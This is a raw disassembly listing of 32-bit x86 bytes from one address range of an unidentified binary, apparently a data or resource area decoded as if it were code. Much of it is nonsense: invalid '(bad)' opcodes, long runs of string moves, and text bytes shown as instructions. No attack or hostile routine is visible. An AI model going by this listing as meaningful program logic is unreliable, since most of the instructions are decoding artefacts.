  422329:	add    BYTE PTR [esi+0x0],dh
  42232c:	add    BYTE PTR gs:[esi+0x0],ch
  422330:	push   0x61006500
  422335:	add    BYTE PTR [esi+0x0],dh
  422338:	add    BYTE PTR gs:[esi+0x0],ch
  42233c:	push   0x61006500
  422341:	add    BYTE PTR [esi+0x0],dh
  422344:	add    BYTE PTR gs:[esi+0x0],ch
  422348:	push   0x61006500
  42234d:	add    BYTE PTR [esi+0x0],dh
  422350:	add    BYTE PTR gs:[esi+0x0],ch
  422354:	push   0x61006500
  422359:	add    BYTE PTR [esi+0x0],dh
  42235c:	add    BYTE PTR gs:[esi+0x0],ch
  422360:	push   0x61006500
  422365:	add    BYTE PTR [esi+0x0],dh
  422368:	add    BYTE PTR gs:[esi+0x0],ch
  42236c:	add    BYTE PTR [eax],al
  42236e:	add    BYTE PTR [eax],al
  422370:	in     al,dx
  422371:	and    al,BYTE PTR [edx+0x0]
  422374:	dec    edi
  422375:	ins    BYTE PTR es:[edi],dx
  422376:	gs dec ecx
  422378:	arpl   WORD PTR [edi+0x6e],bp
  42237b:	push   esp
  42237c:	outs   dx,DWORD PTR ds:[esi]
  42237d:	inc    ebx
  42237e:	jne    0x4223f2
  422380:	jae    0x4223f1
  422382:	jb     0x422384
  422384:	je     0x4223a9
  422386:	inc    edx
	...
  42238f:	add    BYTE PTR [eax],dh
  422391:	daa    
  422392:	inc    edx
  422393:	add    BYTE PTR [eax],bh
  422395:	daa    
  422396:	inc    edx
  422397:	add    al,dh
  422399:	and    eax,0x43f20042
  42239e:	push   ebx
  42239f:	mov    WORD PTR ds:0x1a49ba4,ss
  4223a5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4223a6:	popf   
  4223a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4223a8:	jno    0x42234e
  4223aa:	xchg   edi,eax
  4223ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4223ac:	or     esp,DWORD PTR [ecx+ecx*4-0x7c5bac5c]
  4223b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4223b4:	sbb    DWORD PTR [ebp+eax*4-0x445b645c],esp
  4223bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4223bc:	rol    DWORD PTR [edx-0x5b6a732f],cl
  4223c2:	adc    eax,0x1a49ba4
  4223c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4223c8:	popf   
  4223c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4223ca:	jno    0x422370
  4223cc:	xchg   edi,eax
  4223cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4223ce:	or     esp,DWORD PTR [ecx+ecx*4-0x7c5bac5c]
  4223d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4223d6:	xor    eax,0x9ba485a4
  4223db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4223dc:	mov    ebx,0xd1e2d3a4
  4223e1:	in     al,dx
  4223e2:	xchg   ebp,eax
  4223e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4223e4:	adc    eax,0x3ba49ba4
  4223e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4223ea:	popf   
  4223eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4223ec:	sbb    DWORD PTR [ebp+edx*4-0x705b805c],esp
  4223f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4223f4:	fwait
  4223f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4223f6:	xchg   DWORD PTR [ebx+edx*8-0xe332e3e],esp
  4223fd:	sub    al,0xf7
  4223ff:	cs pop ss
  422401:	push   cs
  422402:	adc    eax,0x3a49108
  422407:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422408:	fwait
  422409:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42240a:	add    esp,DWORD PTR [ebx+edx*4-0x6a5b805c]
  422411:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422412:	sbb    DWORD PTR [ebp+ecx*4-0x7c5b645c],esp
  422419:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42241a:	shl    DWORD PTR [edx],cl
  42241c:	shr    DWORD PTR [ecx+esi*8],1
  42241f:	or     al,0xf7
  422421:	push   cs
  422422:	pop    ss
  422423:	outs   dx,BYTE PTR ds:[esi]
  422424:	adc    eax,0x3a49168
  422429:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42242a:	fwait
  42242b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42242c:	add    esp,DWORD PTR [ebx+edx*4-0x6a5b805c]
  422433:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422434:	xor    eax,0x9ba48da4
  422439:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42243a:	and    DWORD PTR [ebx+edx*8-0xef32efe],0x6c
  422442:	imul   DWORD PTR [esi+0x17]
  422445:	dec    esi
  422446:	adc    eax,0x37a49148
  42244b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42244c:	fwait
  42244d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42244e:	jae    0x4223f4
  422450:	popf   
  422451:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422452:	sbb    DWORD PTR [ebp+edx*4-0x705bba5c],esp
  422459:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42245a:	fwait
  42245b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42245c:	and    DWORD PTR [ebx+edx*8-0xe932e9e],0x4c
  422464:	test   DWORD PTR [esi+0x16],0x91a814ae
  42246b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42246c:	aaa    
  42246d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42246e:	fwait
  42246f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422470:	jae    0x422416
  422472:	popf   
  422473:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422474:	pop    ss
  422475:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422476:	xchg   ebp,eax
  422477:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422478:	push   ecx
  422479:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42247a:	mov    DWORD PTR [ebx+ebx*4-0x2c5b725c],esp
  422481:	inc    edx
  422482:	ror    DWORD PTR [eax+esi*8-0x54],1
  422486:	imul   BYTE PTR [esi-0x77eb71ea]
  42248c:	xchg   ecx,eax
  42248d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42248e:	aaa    
  42248f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422490:	fwait
  422491:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422492:	jae    0x422438
  422494:	popf   
  422495:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422496:	cmp    esp,DWORD PTR [ebp+edx*4-0x705b8c5c]
  42249d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42249e:	fwait
  42249f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224a0:	xchg   DWORD PTR [edx+edx*8-0xf532f5e],esp
  4224a7:	mov    esi,?
  4224a9:	mov    ss,WORD PTR [esi]
  4224ab:	out    dx,al
  4224ac:	adc    al,0xe8
  4224ae:	xchg   ecx,eax
  4224af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224b0:	aaa    
  4224b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224b2:	fwait
  4224b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224b4:	jae    0x42245a
  4224b6:	popf   
  4224b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224b8:	cmp    DWORD PTR [ebp+edx*4-0x705b805c],esp
  4224bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224c0:	fwait
  4224c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224c2:	and    DWORD PTR [edx+edx*8-0xf732f7e],0xffffffec
  4224ca:	imul   dh
  4224cc:	push   ss
  4224cd:	into   
  4224ce:	adc    al,0xc8
  4224d0:	xchg   ecx,eax
  4224d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224d2:	cmp    eax,0x51a49ba4
  4224d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224d8:	popf   
  4224d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224da:	jnp    0x422480
  4224dc:	xchg   ebx,eax
  4224dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224de:	fwait
  4224df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224e0:	xchg   ecx,eax
  4224e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224e2:	shl    dl,cl
  4224e4:	shr    ah,1
  4224e6:	lock int3 
  4224e8:	test   dh,0x16
  4224eb:	cs adc al,0x28
  4224ee:	push   ss
  4224ef:	push   cs
  4224f0:	adc    al,0x8
  4224f2:	xchg   ebx,eax
  4224f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224f4:	adc    DWORD PTR [ebx+ebx*4-0x605bb65c],esp
  4224fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224fc:	cmp    esp,DWORD PTR [ebx+edx*4-0x765b825c]
  422503:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422504:	fwait
  422505:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422506:	lea    esp,[edx+edx*8-0xfd32fde]
  42250d:	or     al,0xf6
  42250f:	push   cs
  422510:	push   ss
  422511:	outs   dx,BYTE PTR ds:[esi]
  422512:	adc    al,0x68
  422514:	xchg   ecx,eax
  422515:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422516:	add    BYTE PTR [eax],al
  422518:	mov    al,ds:0xac004223
  42251d:	and    eax,0x25b40042
  422522:	inc    edx
  422523:	add    BYTE PTR [edi+eiz*1],bh
  422526:	inc    edx
  422527:	add    BYTE PTR [eax-0x47ffbddd],bl
  42252d:	and    eax,0x7c1a0042
  422532:	inc    edx
  422533:	add    BYTE PTR [edx-0x57ffbd82],dl
  422539:	es inc edx
  42253b:	add    BYTE PTR [edi+eiz*1],ch
  42253e:	inc    edx
  42253f:	add    BYTE PTR [ebp+eiz*1+0x25980042],dl
  422546:	inc    edx
  422547:	add    BYTE PTR [eax],ch
  422549:	daa    
  42254a:	inc    edx
  42254b:	add    ah,bh
  42254d:	and    eax,0xcb4a0042
  422552:	push   es
  422553:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422554:	scas   al,BYTE PTR es:[edi]
  422555:	or     al,0x6
  422557:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422558:	mov    al,0x25
  42255a:	inc    edx
  42255b:	add    BYTE PTR [eax+0x26],ah
  42255e:	inc    edx
  42255f:	add    BYTE PTR [esi+eiz*1+0x42],dh
  422563:	add    BYTE PTR [eax-0x6fffbdda],al
  422569:	es inc edx
  42256b:	add    al,ch
  42256d:	and    eax,0x239c0042
  422572:	inc    edx
  422573:	add    BYTE PTR [eax],cl
  422575:	es inc edx
  422577:	add    al,bh
  422579:	and    eax,0x27400042
  42257e:	inc    edx
  42257f:	add    BYTE PTR [esi+0x38a4069a],ch
  422585:	inc    ebx
  422586:	out    0xbd,eax
  422588:	sbb    BYTE PTR [esi],ah
  42258a:	inc    edx
  42258b:	add    BYTE PTR [eax],ah
  42258d:	es inc edx
  42258f:	add    BYTE PTR [ebp+eiz*1-0x78dbffbe],bh
  422596:	loopne 0x422555
  422598:	jbe    0x422615
  42259a:	pop    ds
  42259b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42259c:	add    BYTE PTR [eax],al
  42259e:	inc    eax
  42259f:	add    dl,ch
  4225a1:	rcl    dl,cl
  4225a3:	pop    ecx
  4225a4:	(bad)  
  4225a5:	jle    0x4225e9
  4225a7:	add    bl,bl
  4225a9:	outs   dx,DWORD PTR fs:[esi]
  4225ab:	arpl   WORD PTR [edi+0xf],si
  4225ae:	pop    ebx
  4225af:	xor    DWORD PTR [esi-0x5],esi
  4225b2:	(bad)  
  4225b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4225b4:	mov    dl,0xc
  4225b6:	xchg   ebx,eax
  4225b7:	test   al,0xa4
  4225b9:	and    eax,0xdaaa0042
  4225be:	push   es
  4225bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4225c0:	stos   BYTE PTR es:[edi],al
  4225c1:	fiadd  WORD PTR [esi]
  4225c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4225c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4225c5:	fiadd  DWORD PTR [esi]
  4225c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4225c8:	mov    ds:0xbea406da,al
  4225cd:	fiadd  DWORD PTR [esi]
  4225cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4225d0:	mov    edx,0xb6a406da
  4225d5:	fiadd  DWORD PTR [esi]
  4225d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4225d8:	mov    dl,0xda
  4225da:	push   es
  4225db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4225dc:	mov    ds,edx
  4225de:	push   es
  4225df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4225e0:	mov    bl,dl
  4225e2:	push   es
  4225e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4225e4:	out    dx,al
  4225e5:	fiadd  DWORD PTR [esi]
  4225e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4225e8:	dec    DWORD PTR [ebx]
  4225ea:	adc    edi,DWORD PTR [edx]
  4225ec:	xchg   esp,eax
  4225ed:	and    eax,DWORD PTR [edx+0x0]
  4225f0:	test   DWORD PTR [eax],ebp
  4225f2:	inc    edx
  4225f3:	add    BYTE PTR [edi],dl
  4225f5:	loop   0x422580
  4225f7:	js     0x4225a7
  4225f9:	call   0xa4d7:0xcb3aa406
  422600:	and    al,0x75
  422602:	add    BYTE PTR [eax],al
  422604:	nop
  422605:	and    eax,DWORD PTR [edx+0x0]
  422608:	and    al,BYTE PTR [ebx+0x1b]
  42260b:	add    BYTE PTR [eax],0x0
	...
  422616:	add    BYTE PTR [eax],al
  422618:	hlt    
  422619:	clc    
  42261a:	sar    BYTE PTR [ebp+0x319340bf],cl
  422620:	sub    eax,DWORD PTR [edi+0x1f]
  422623:	jle    0x422625
	...
  422649:	add    BYTE PTR [eax],al
  42264b:	add    BYTE PTR [edx],bl
  42264d:	jl     0x422691
	...
  42265b:	add    cl,bh
  42265d:	jmp    0xa48f26a3
  422662:	push   ecx
  422663:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422664:	jg     0x42260a
  422666:	inc    edi
  422667:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422668:	push   ecx
  422669:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42266a:	inc    ebx
  42266b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42266c:	std    
  42266d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42266e:	jmp    DWORD PTR [ebx+ebx*4+0x550000a4]
  422675:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422676:	push   ebx
  422677:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422678:	dec    ecx
  422679:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42267a:	std    
  42267b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42267c:	jmp    DWORD PTR [ebx+ebx*4+0x7da471a4]
  422683:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422684:	push   ecx
  422685:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422686:	jg     0x42262c
  422688:	std    
  422689:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42268a:	jmp    DWORD PTR [ebx+ebx*4+0x7d0000a4]
  422691:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422692:	dec    ebx
  422693:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422694:	inc    ebx
  422695:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422696:	jne    0x42263c
  422698:	pop    ecx
  422699:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42269a:	jnp    0x422640
  42269c:	dec    ecx
  42269d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42269e:	fwait
  42269f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
	...
  4226a8:	xor    eax,eax
  4226aa:	xor    esp,DWORD PTR [eax]
  4226ac:	xor    eax,DWORD PTR [eax]
  4226ae:	xor    esp,DWORD PTR [eax+0x33]
  4226b1:	inc    eax
  4226b2:	xor    ah,BYTE PTR [eax-0x1fcd7fce]
  4226b8:	xor    al,al
  4226ba:	xor    ah,BYTE PTR [eax]
  4226bc:	xor    al,BYTE PTR [eax]
  4226be:	xor    ah,BYTE PTR [eax+0x32]
  4226c1:	inc    eax
  4226c2:	xor    eax,DWORD PTR [eax-0x3dcc1fcd]
  4226c8:	xor    ecx,esp
  4226ca:	xor    ecx,esi
  4226cc:	xor    ecx,eax
  4226ce:	xor    ecx,edx
  4226d0:	xor    edx,esp
  4226d2:	xor    edx,esi
  4226d4:	xor    edx,eax
  4226d6:	xor    edx,edx
  4226d8:	xor    ebx,esp
  4226da:	xor    ebx,esi
  4226dc:	xor    ebx,eax
  4226de:	xor    ebx,edx
  4226e0:	xor    eax,esi
  4226e2:	push   ebx
  4226e3:	shl    BYTE PTR [ebx-0x40],0x93
  4226e7:	rcl    DWORD PTR [esi-0x56],0x15
  4226eb:	into   
  4226ec:	xchg   ebp,eax
  4226ed:	dec    ecx
  4226ee:	xor    ecx,esp
  4226f0:	sbb    eax,0x50abaae2
  4226f5:	push   0x1e
  4226f7:	cs je  0x42270e
  4226fa:	mov    DWORD PTR [ebx+0x546ad794],ecx
  422700:	imul   edi,edx,0xffffffd5
  422703:	leave  
  422704:	daa    
  422705:	dec    eax
  422706:	out    dx,eax
  422707:	pushf  
  422708:	mov    dh,0xdf
  42270a:	dec    esi
  42270b:	xchg   ebp,eax
  42270c:	lock xor DWORD PTR [esi-0x6c],ebp
  422710:	inc    ebp
  422711:	or     eax,0xc1470876
  422716:	js     0x4226d3
  422718:	popa   
  422719:	pop    ecx
  42271a:	jecxz  0x422787
  42271c:	mov    BYTE PTR [edx-0x56],0x5
  422720:	cs enter 0xaa46,0x44
  422725:	aas    
  422726:	inc    ebp
  422727:	leave  
  422728:	test   BYTE PTR [ebx+0x819a593],0xd8
  42272f:	jl     0x422759
  422731:	mov    es,WORD PTR [edx+0x0]
  422734:	jb     0x422790
  422736:	pop    ss
  422737:	sub    ebx,DWORD PTR [ebp+eiz*1+0x26000042]
  42273e:	inc    edx
  42273f:	add    BYTE PTR [esi-0x5],dh
  422742:	fbld   TBYTE PTR [ebp+0x0]
	...
  422750:	adc    edi,DWORD PTR [edx+0x6f6bd319]
  422756:	popa   
  422757:	arpl   WORD PTR [edi+0x7a],bp
  42275a:	popa   
  42275b:	outs   dx,DWORD PTR ds:[si]
  42275d:	gs ins DWORD PTR es:[edi],dx
  42275f:	jae    0x4227a3
  422761:	outs   dx,DWORD PTR ds:[esi]
  422762:	ins    BYTE PTR es:[edi],dx
  422763:	gs mov cl,0x65
  422766:	in     eax,dx
  422767:	jg     0x4227a2
  422769:	ja     0x4227d4
  42276b:	jp     0x422760
  42276d:	inc    esp
  42276e:	push   0x1b
  422770:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422771:	push   ecx
  422772:	dec    esp
  422773:	gs jb  0x4227ef
  422776:	popa   
  422777:	push   ebx
  422778:	jne    0x4227eb
  42277a:	jae    0x4227dd
  42277c:	imul   esi,DWORD PTR [edx+0x6f],0x91565070
  422783:	inc    esp
  422784:	(bad)  [edx+0x65]
  422787:	jae    0x4227df
  422789:	imul   esi,DWORD PTR [ebx+0x61],0x616c6974
  422790:	jb     0x4227f4
  422792:	gs je  0x422768
  422795:	lds    edx,FWORD PTR [eax-0x68]
  422798:	xor    dl,BYTE PTR [eax+ecx*1+0x1d]
  42279c:	fs jne 0x42280e
  42279f:	push   eax
  4227a0:	gs fs jae 0x422811
  4227a4:	popa   
  4227a5:	ins    DWORD PTR es:[edi],dx
  4227a6:	imul   esi,DWORD PTR [ebx+0x0],0x0
	...
  4227b9:	add    BYTE PTR [eax],al
  4227bb:	add    BYTE PTR [esp+ecx*4],ch
  4227be:	push   ss
  4227bf:	mov    esi,0x6f4c8773
  4227c4:	jb     0x422834
  4227c6:	jno    0x422831
  4227c8:	or     al,0x36
  4227ca:	lods   al,BYTE PTR ds:[esi]
  4227cb:	repnz push edx
  4227cd:	je     0x42283e
  4227cf:	je     0x422815
  4227d1:	js     0x42278f
  4227d3:	cmc    
  4227d4:	outs   dx,DWORD PTR ds:[esi]
  4227d5:	ins    DWORD PTR es:[edi],dx
  4227d6:	popa   
  4227d7:	imul   esp,DWORD PTR [eax-0x77],0x67411cbf
  4227de:	popa   
  4227df:	jb     0x422856
  4227e1:	push   0x68736f79
  4227e6:	imul   ebp,DWORD PTR [esi+0x74],0x1d006261
  4227ed:	mov    ch,0xa5
  4227ef:	jns    0x422864
  4227f1:	outs   dx,DWORD PTR ds:[esi]
  4227f2:	addr16 popa 
  4227f4:	add    BYTE PTR [bp+si],bh
  4227f7:	sub    bh,cl
  4227f9:	icebp  
  4227fa:	gs ins BYTE PTR es:[edi],dx
  4227fc:	jae    0x422846
  4227fe:	popa   
  4227ff:	je     0x422869
  422801:	ins    DWORD PTR es:[edi],dx
  422802:	add    BYTE PTR gs:[bx+si],al
  422806:	in     al,dx
  422807:	mov    ecx,0x414ad1d2
  42280c:	ins    DWORD PTR es:[edi],dx
  42280d:	imul   esi,DWORD PTR [ebx+0x4b],0x676c686f
  422814:	gs ins DWORD PTR es:[edi],dx
  422816:	add    BYTE PTR [eax],al
  422818:	jne    0x42282a
  42281a:	popa   
  42281b:	or     BYTE PTR [esi+0x73654dbb],al
  422821:	popa   
  422822:	push   0x78000061
  422827:	loope  0x42286b
  422829:	stos   BYTE PTR es:[edi],al
  42282a:	je     0x42288d
  42282c:	push   edi
  42282d:	popa   
  42282e:	jb     0x42289b
  422830:	jae    0x42289d
  422832:	imul   esi,DWORD PTR [edx+0x68],0x4100006f
  422839:	loope  0x422807
  42283b:	aad    0x6f
  42283d:	jb     0x4228ab
  42283f:	imul   ebp,DWORD PTR [ebp+0x69],0x8b060000
  422846:	je     0x42285b
  422848:	adc    al,BYTE PTR [ebp+0x77646172]
  42284e:	outs   dx,DWORD PTR ds:[esi]
  42284f:	gs ins DWORD PTR es:[edi],dx
  422851:	imul   edi,DWORD PTR [eax+0x66],0x65706769
  422858:	outs   dx,BYTE PTR ds:[esi]
  422859:	shr    DWORD PTR fs:[ebx+0x61018e3a],cl
  422860:	ja     0x4228c6
  422862:	outs   dx,DWORD PTR ds:[esi]
  422863:	popa   
  422864:	outs   dx,BYTE PTR ds:[esi]
  422865:	gs jae 0x4228ca
  422868:	imul   ebp,DWORD PTR [edi+0x72],0x75536465
  42286f:	imul   esi,DWORD PTR [edi+edx*2+0x6f],0x2dea6576
  422877:	inc    ebx
  422878:	jb     0x422833
  42287a:	sbb    al,0xd9
  42287c:	jo     0x4228e7
  42287e:	addr16 js 0x4228f6
  422881:	jo     0x4228f8
  422883:	fs add ch,cl
  422886:	xchg   esi,eax
  422887:	in     eax,dx
  422888:	jno    0x4228fb
  42288a:	iret   
  42288b:	jbe    0x422886
  42288d:	or     dh,BYTE PTR [esi-0x3]
  422890:	cwde   
  422891:	int    0xd6
  422893:	std    
  422894:	pop    ebp
  422895:	fsubr  DWORD PTR [edi]
  422897:	dec    edx
  422898:	xor    eax,0xd6cd860a
  42289d:	stc    
  42289e:	inc    ebx
  42289f:	adc    DWORD PTR [eax+0x6e7988d6],ebp
  4228a5:	dec    edx
  4228a6:	sbb    BYTE PTR [ecx+0x52],bh
  4228a9:	mov    ch,al
  4228ab:	jns    0x4228ff
  4228ad:	dec    edx
  4228ae:	sbb    BYTE PTR [ecx+0x6e],bh
  4228b1:	xchg   edx,eax
  4228b2:	cmp    eax,0xcd96c5cb
  4228b7:	in     eax,dx
  4228b8:	jno    0x42292b
  4228ba:	iret   
  4228bb:	jbe    0x4228b6
  4228bd:	or     dh,BYTE PTR [esi-0x3]
  4228c0:	int    0x96
  4228c2:	std    
  4228c3:	pop    ebp
  4228c4:	jns    0x422911
  4228c6:	pop    edx
  4228c7:	xor    eax,0x96cd920a
  4228cc:	stc    
  4228cd:	inc    ebx
  4228ce:	icebp  
  4228cf:	(bad)  
  4228d0:	das    
  4228d1:	int    0x76
  4228d3:	mov    BYTE PTR [ecx+0x6e],bh
  4228d6:	mov    DWORD PTR [edx-0x13749387],esi
  4228dc:	jns    0x42294c
  4228de:	xchg   BYTE PTR [edi-0x3d789187],ah
  4228e4:	retf   
  4228e5:	rol    BYTE PTR [eax+eax*4+0x71edcd96],cl
  4228ec:	jno    0x4228bd
  4228ee:	jbe    0x4228e9
  4228f0:	or     dh,BYTE PTR [esi-0x3]
  4228f3:	int    0x96
  4228f5:	std    
  4228f6:	pop    ebp
  4228f7:	fdiv   DWORD PTR [ebx-0x6df55465]
  4228fd:	int    0x96
  4228ff:	stc    
  422900:	inc    ebx
  422901:	icebp  
  422902:	(bad)  
  422903:	test   BYTE PTR [ecx+0x6e],bh
  422906:	mov    ebp,esp
  422908:	int    0x76
  42290a:	mov    BYTE PTR [ecx+0x6e],bh
  42290d:	add    DWORD PTR [edi+0x79],0xcbd2896c
  422914:	rol    BYTE PTR [eax+eax*4+0x71edcd96],cl
  42291b:	jno    0x4228ec
  42291d:	jbe    0x422918
  42291f:	or     dh,BYTE PTR [esi-0x3]
  422922:	cwde   
  422923:	int    0xd6
  422925:	std    
  422926:	pop    ebp
  422927:	ret    0x2be4
  42292a:	cmp    DWORD PTR [edx],ecx
  42292c:	xchg   ch,cl
  42292e:	(bad)  
  42292f:	stc    
  422930:	inc    ebx
  422931:	adc    DWORD PTR [eax+0x52794ad6],ebp
  422937:	test   BYTE PTR [ebx-0x78913648],ch
  42293d:	ret    0x79ab
  422940:	xchg   edx,eax
  422941:	aad    0xcb
  422943:	lds    edx,FWORD PTR [esi+0x7171edcd]
  422949:	iret   
  42294a:	jbe    0x422945
  42294c:	or     dh,BYTE PTR [esi-0x3]
  42294f:	int    0x96
  422951:	std    
  422952:	pop    ebp
  422953:	pop    ecx
  422954:	ins    BYTE PTR es:[edi],dx
  422955:	cmp    dh,BYTE PTR ds:0x96cd920a
  42295b:	stc    
  42295c:	inc    ebx
  42295d:	icebp  
  42295e:	(bad)  
  42295f:	push   ebx
  422960:	int    0x76
  422962:	mov    BYTE PTR [ecx+0x6e],bh
  422965:	mov    BYTE PTR [edi+0x47816c79],ah
  42296b:	jns    0x4229db
  42296d:	test   DWORD PTR [ebx-0x7f7b2d35],esp
  422973:	call   0xcded:0xcd965b98
  42297a:	jbe    0x4229b0
  42297c:	xor    DWORD PTR [esi+0x3c],0xd6cdfd70
  422983:	sbb    al,0x81
  422985:	(bad)  
  422986:	and    al,0x98
  422988:	int    0xd6
  42298a:	adc    al,0x47
  42298c:	mov    ds:0xff8eca62,al
  422991:	add    al,0x7d
  422993:	add    ch,dl
  422995:	lods   eax,DWORD PTR ds:[esi]
  422996:	clc    
  422997:	icebp  
  422998:	jo     0x422964
  42299a:	(bad)  
  42299c:	jge    0x42299e
  42299e:	aad    0xad
  4229a0:	clc    
  4229a1:	icebp  
  4229a2:	jo     0x422936
  4229a4:	adc    ecx,ebp
  4229a6:	inc    DWORD PTR [ebp*8+0x6c6d334c]
  4229ad:	jo     0x422a1f
  4229af:	jo     0x422a21
  4229b1:	jo     0x42294d
  4229b3:	xor    esi,edi
  4229b5:	cwde   
  4229b6:	add    al,0xc
  4229b8:	add    BYTE PTR [ebp-0x80],bl
  4229bb:	xchg   DWORD PTR [eax-0x30522a80],eax
  4229c1:	or     DWORD PTR [eax-0x75],ebx
  4229c4:	add    BYTE PTR [eax-0x7f7b7fa3],0x84
  4229cb:	jecxz  0x4229b8
  4229cd:	hlt    
  4229ce:	scas   eax,DWORD PTR es:[edi]
  4229cf:	rol    BYTE PTR [ebp-0x6def4262],0x80
  4229d6:	sub    dl,0xfa
  4229d9:	iret   
  4229da:	pop    eax
  4229db:	iret   
  4229dc:	push   0xffffffcd
  4229de:	out    0xfd,al
  4229e0:	int    0x76
  4229e2:	adc    DWORD PTR [ebx],esi
  4229e4:	out    0x34,al
  4229e6:	sub    ecx,ecx
  4229e8:	or     dh,BYTE PTR [esi-0x43]
  4229eb:	rol    BYTE PTR [eax-0x7f6d1243],1
  4229f1:	sub    BYTE PTR [edi],0x6
  4229f4:	sub    DWORD PTR [eax-0x72357f80],eax
  4229fa:	cmc    
  4229fb:	sub    esp,esi
  4229fd:	in     eax,dx
  4229fe:	aad    0xe9
  422a00:	add    ebx,ebp
  422a02:	mov    bh,dh
  422a04:	fcmovnbe st,st(5)
  422a06:	out    dx,eax
  422a07:	pushf  
  422a08:	xchg   edi,edi
